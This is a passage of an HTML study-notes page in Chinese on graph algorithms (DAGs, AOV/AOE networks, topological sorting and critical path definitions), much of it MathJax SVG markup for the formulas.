151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="1.944ex" height="1.668ex" role="img" focusable="false" viewBox="0 -443 859.3 737.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>的所有可能存在的路径中选出一条长度最短的路径</li></ol><h4 id="3-2-4-3-有向无环图及其应用"><a href="#3-2-4-3-有向无环图及其应用" class="headerlink" title="3.2.4.3 有向无环图及其应用"></a>3.2.4.3 有向无环图及其应用</h4><p>有向无环图：无环的有向图，简称DAG图。</p><p>有向无环图常用来描述一个工程或系统的进行过程。一个工程可以分为若干个子工程，只要完成了这些子工程(活动)就可以导致整个工程的完成。</p><p>AOV网：用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以顶点表示活动，弧表示活动之间的优先制约关系，称这种有向图为顶点表示活动的网，简称AOV网。AOV网应用于拓扑排序。</p><p>AOE网：用一个有向图表示一个工程的各子工程及其相互制约的关系，其中以弧表示活动，顶点表示活动的开始或结束事件，称这种有向图为边表示活动的网，简称AOE网。AOE网应用于关键路径问题。</p><h5 id="3-2-4-3-1-拓扑排序"><a href="#3-2-4-3-1-拓扑排序" class="headerlink" title="3.2.4.3.1 拓扑排序"></a>3.2.4.3.1 拓扑排序</h5><p>AOV网的特点：</p><ul><li>若从i到j有一条有向路径，则i是j的前驱；j是i的后继</li><li>若<i,j>是网中有向边，则i是j的直接前驱；j是i的直接后继</i,j></li><li>AOV网中不允许有回路，因为如果有回路存在，则表明某项活动以自己为先决条件，显然这是荒谬的</li></ul><p>问题：如何判断AOV网中是否有回路？</p><p>在AOV网没有回路的前提下，我们将全部活动排列成一个线性序列，使得若AOV网中有弧<i,j>存在，则在这个序列中，i一定排在j的前面，具有这种性质的线性序列称为拓扑有序序列，相应的拓扑有序排序的算法称为拓扑排序。</i,j></p><p>拓扑排序的方法：</p><ul><li>在有向图中选一个没有前驱的顶点且输出之</li><li>从图中删除该顶点和所有以它为尾的弧</li><li>重复上述两步，直至全部顶点均已输出；或者当图中不存在无前驱的顶点为止</li></ul><p>一个AOV网的拓扑序列不是唯一的。</p><p>拓扑排序的一个重要应用：检测AOV网中是否存在环的方法：对有向图构造其顶点的拓扑有序序列，若网中所有顶点都在它的拓扑有序序列中，则该AOV网必定不存在环。</p><h5 id="3-2-4-3-2-关键路径"><a href="#3-2-4-3-2-关键路径" class="headerlink" title="3.2.4.3.2 关键路径"></a>3.2.4.3.2 关键路径</h5><p>把工程计划表示为边表示活动的网络，即AOE网，用顶点表示事件，弧表示活动，弧的权表示活动持续时间。事件表示在它之前的活动已经完成，在它之后的活动可以开始。</p><p>设一个工程有11项活动，9个事件。</p><p>事件v1——表示整个工程开始(源点：入度为0的顶点)</p><p>事件v9——表示整个工程结束(汇点：出度为0的顶点)</p><img src="/posts/79666db/3.2.4.3.2.png" class="" title="关键路径例题"><p>对于AOE网，我们关心两个问题：</p><ol><li>完成整项工程至少需要多长时间？</li><li>哪些活动是影响工程进度的关键？</li></ol><p>本质上是求解关键路径的问题。如何确定关键路径，需要定义4个描述量：</p><ul><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="5.856ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 2588.3 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(951,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1340,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(2199.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>——表示事件<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="1.944ex" height="1.668ex" role="img" focusable="false" viewBox="0 -443 859.3 737.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>的最早发生时间</li><li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="5.476ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 2420.3 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(783,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1172,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(2031.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>——表示事件<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="1.944ex" height="1.668ex" role="img" focusable="false" viewBox="0 -443 859.3 737.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(518,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>的最迟发生时间</li><li>e(i)——表示活动ai的最早开始时间</li><li>l(i)——表示活动ai的最迟开始时间</li></ul><p>l(i)-e(i)——表示完成活动ai的时间余量</p><p>关键活动——关键路径上的活动，即l(i)==e(i)的活动</p><p>如何找l(i)==e(i)的关键活动？</p><ul><li>设活动ai用弧<j,k>表示，其持续时间记为：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="3.745ex" height="1.668ex" role="img" focusable="false" viewBox="0 -443 1655.3 737.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(749,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(690,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g></g></g></g></g></svg></mjx-container>，则有：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="30.945ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 13677.9 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(466,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(855,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1200,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(1866.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2922.6,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(3407.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(3873.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4262.6,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(4674.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(5063.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(5963.6,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(6261.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6650.6,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(6995.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7662.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(8718.1,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(9203.1,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mo" transform="translate(9501.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(9890.1,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(10411.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 